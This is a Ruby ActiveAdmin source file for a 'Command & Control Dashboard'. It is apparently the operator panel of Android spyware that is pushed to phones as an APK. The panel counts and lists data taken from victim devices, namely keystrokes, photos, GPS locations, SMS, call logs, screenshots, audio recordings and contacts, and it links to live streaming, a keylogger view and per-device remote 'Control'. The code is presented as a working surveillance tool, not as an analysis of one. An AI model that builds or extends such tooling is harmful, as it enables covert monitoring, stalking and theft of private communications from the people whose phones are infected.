ActiveAdmin.register_page "Dashboard" do
  menu priority: 1, label: "📊 Dashboard"

  action_item :tracing do
    link_to "🔍 Tracing (Jaeger)", "http://localhost:16686", target: "_blank", class: "button"
  end

  action_item :live_streaming do
    link_to "📹 Live Streaming", admin_live_streaming_path, class: "button primary"
  end

  action_item :keylogger do
    link_to "⌨️ Keylogger", admin_keylogger_dashboard_path, class: "button"
  end

  content title: "🎯 Command & Control Dashboard" do
    # Connected devices stats
    connected_devices = Smartphone.joins(:apk_installation)
                                  .where("apk_installations.status = ?", "installed")
                                  .count
    total_devices = Smartphone.count
    
    # Data collection stats (last 24h)
    last_24h = 24.hours.ago
    new_keylogs = 0 # TODO: Implement keylog count from JSON logs
    new_photos = Picture.where("created_at > ?", last_24h).count
    new_locations = GeoLocation.where("created_at > ?", last_24h).count
    new_sms = SmsMessage.where("created_at > ?", last_24h).count
    new_calls = CallLog.where("created_at > ?", last_24h).count
    
    # Activity feed
    recent_activity = []
    
    # Collect recent data
    Picture.order(created_at: :desc).limit(5).each do |pic|
      recent_activity << { 
        type: "📷 Photo Captured", 
        time: pic.created_at, 
        device: pic.smartphone&.name || "Unknown"
      }
    end
    
    GeoLocation.order(created_at: :desc).limit(5).each do |loc|
      recent_activity << { 
        type: "📍 Location Update", 
        time: loc.created_at, 
        device: loc.smartphone&.name || "Unknown",
        details: "#{loc.latitude}, #{loc.longitude}"
      }
    end
    
    Screenshot.order(created_at: :desc).limit(5).each do |ss|
      recent_activity << { 
        type: "🖥️ Screenshot", 
        time: ss.created_at, 
        device: ss.smartphone&.name || "Unknown"
      }
    end
    
    Recording.order(created_at: :desc).limit(5).each do |rec|
      recent_activity << { 
        type: "🎤 Audio Recording", 
        time: rec.created_at, 
        device: rec.smartphone&.name || "Unknown"
      }
    end
    
    # Sort by time descending, take top 10
    recent_activity = recent_activity.sort_by { |a| a[:time] }.reverse.take(10)

    # === Modern Dashboard Layout ===
    
    # Row 1: Key Metrics Cards
    columns do
      column do
        panel "🖥️ Connected Devices", class: "metric-card" do
          div class: "metric-value" do
            span connected_devices, class: "big-number connected"
            span " / #{total_devices}", class: "total"
          end
          div class: "metric-label" do
            "Active Devices Online"
          end
        end
      end
      
      column do
        panel "⌨️ Keylogs (24h)", class: "metric-card" do
          div class: "metric-value" do
            span new_keylogs, class: "big-number"
          end
          div class: "metric-label" do
            "Keystrokes Captured"
          end
        end
      end
      
      column do
        panel "📷 Photos (24h)", class: "metric-card" do
          div class: "metric-value" do
            span new_photos, class: "big-number"
          end
          div class: "metric-label" do
            "Photos Captured"
          end
        end
      end
      
      column do
        panel "📍 Locations (24h)", class: "metric-card" do
          div class: "metric-value" do
            span new_locations, class: "big-number"
          end
          div class: "metric-label" do
            "GPS Updates"
          end
        end
      end
    end
    
    # Row 2: Communication Stats
    columns do
      column do
        panel "📱 SMS (24h)", class: "metric-card secondary" do
          div class: "metric-value" do
            span new_sms, class: "big-number"
          end
        end
      end
      
      column do
        panel "📞 Calls (24h)", class: "metric-card secondary" do
          div class: "metric-value" do
            span new_calls, class: "big-number"
          end
        end
      end
      
      column do
        panel "🖼️ Screenshots", class: "metric-card secondary" do
          div class: "metric-value" do
            span Screenshot.count, class: "big-number"
          end
        end
      end
      
      column do
        panel "🎤 Recordings", class: "metric-card secondary" do
          div class: "metric-value" do
            span Recording.count, class: "big-number"
          end
        end
      end
    end
    
    # Row 3: Activity Feed & Device List
    columns do
      column span: 2 do
        panel "📋 Recent Activity", class: "activity-feed" do
          if recent_activity.empty?
            para "No recent activity. Waiting for data...", class: "placeholder-text"
          else
            table_for recent_activity do
              column "Type" do |activity|
                span activity[:type], class: "activity-type"
              end
              column "Device" do |activity|
                span activity[:device], class: "device-name"
              end
              column "Details" do |activity|
                span activity[:details], class: "activity-details" if activity[:details]
              end
              column "Time" do |activity|
                span time_ago_in_words(activity[:time]), class: "time-ago"
              end
            end
          end
        end
      end
      
      column do
        panel "📱 Connected Devices", class: "device-list" do
          devices = Smartphone.joins(:apk_installation)
                             .where("apk_installations.status = ?", "installed")
                             .limit(10)
          
          if devices.empty?
            para "No devices connected.", class: "placeholder-text"
          else
            table_for devices do
              column "Device" do |device|
                div class: "device-info" do
                  strong device.name || "Unknown"
                  br
                  span device.operating_system, class: "os-badge"
                end
              end
              column "Status" do |device|
                status_badge "🟢 Online", class: "status-online"
              end
              column "Actions" do |device|
                link_to "Control", admin_remote_path(device_id: device.id), class: "button mini"
              end
            end
          end
        end
      end
    end
    
    # Row 4: Quick Actions
    panel "⚡ Quick Actions", class: "quick-actions" do
      div class: "action-buttons" do
        link_to "📹 Start Live Stream", admin_live_streaming_path, class: "button primary large"
        link_to "⌨️ View Keylogs", admin_keylogger_dashboard_path, class: "button large"
        link_to "📍 Track Locations", admin_geo_locations_path, class: "button large"
        link_to "📷 View Photos", admin_pictures_path, class: "button large"
        link_to "🎤 Recordings", admin_recordings_path, class: "button large"
        link_to "📱 SMS Messages", admin_sms_messages_path, class: "button large"
        link_to "📞 Call Logs", admin_call_logs_path, class: "button large"
        link_to "📇 Contacts", admin_contacts_path, class: "button large"
      end
    end
    
    # CSS Styles for modern dashboard
    text_node helpers.style_tag <<~CSS
      .metric-card {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        border: none;
        border-radius: 12px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        color: white;
        padding: 20px;
        transition: transform 0.3s ease, box-shadow 0.3s ease;
      }

      .metric-card:hover {
        transform: translateY(-5px);
        box-shadow: 0 8px 25px rgba(0,0,0,0.15);
      }

      .metric-card.secondary {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        opacity: 0.9;
      }

      .metric-value {
        font-size: 48px;
        font-weight: bold;
        margin-bottom: 10px;
      }

      .big-number {
        display: inline-block;
        animation: countUp 0.5s ease-out;
      }

      .big-number.connected {
        color: #4ade80;
      }

      .metric-value .total {
        font-size: 24px;
        opacity: 0.7;
      }

      .metric-label {
        font-size: 14px;
        text-transform: uppercase;
        letter-spacing: 1px;
        opacity: 0.9;
      }

      .activity-feed table {
        width: 100%;
      }

      .activity-type {
        font-weight: bold;
      }

      .device-name {
        color: #667eea;
        font-weight: 500;
      }

      .time-ago {
        color: #64748b;
        font-size: 0.9em;
      }

      .device-list table {
        width: 100%;
      }

      .device-info {
        line-height: 1.6;
      }

      .os-badge {
        background: #e0e7ff;
        color: #4f46e5;
        padding: 2px 8px;
        border-radius: 4px;
        font-size: 0.8em;
      }

      .status-online {
        background: #dcfce7;
        color: #16a34a;
        padding: 4px 12px;
        border-radius: 6px;
        font-weight: 500;
      }

      .button.mini {
        padding: 4px 12px;
        font-size: 0.85em;
      }

      .quick-actions .action-buttons {
        display: flex;
        flex-wrap: wrap;
        gap: 12px;
        justify-content: center;
      }

      .button.large {
        padding: 12px 24px;
        font-size: 1em;
        border-radius: 8px;
      }

      .button.primary {
        background: #667eea;
        color: white;
      }

      .placeholder-text {
        text-align: center;
        color: #94a3b8;
        padding: 40px 20px;
        font-style: italic;
      }

      @keyframes countUp {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
      }
    CSS
  end
end
